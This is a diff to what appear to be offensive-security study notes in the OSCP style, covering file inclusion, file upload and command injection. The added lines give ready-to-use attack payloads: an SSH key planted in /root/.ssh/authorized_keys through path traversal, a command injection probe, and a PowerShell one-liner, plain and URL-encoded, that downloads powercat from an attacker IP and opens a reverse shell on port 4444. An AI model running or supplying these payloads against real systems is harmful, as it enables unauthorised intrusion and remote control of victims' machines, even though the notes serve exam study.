@@ -173,11 +173,51 @@ index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJd
 ```
 python3 -m http.server 80
 
-index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls
+index.php?page=http://192.168.45.235/simple-backdoor.php&cmd=ls
 ```
 
 ## File Upload
 
+### Using Executable Files
+
+### Using Non-Executable Files
+
+```bash
+ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+...
+
+cat fileup.pub > authorized_keys
+
+../../../../../../../../root/.ssh/authorized_keys
+```
+
 ## Command Injection
+
+### found injection symbols
+
+` = %60
+
+`" " ' ; | & && || $ ( ) `
+
+
+<https://gabb4r.gitbook.io/oscp-notes/cheatsheet/command-injection-cheatsheet>
+
+### execute command
+
+```
+
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
+
+```
+
+```powershell
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell
+
+IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.235%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.235%20-p%204444%20-e%20powershell
+```
 
 ## SQL Injection
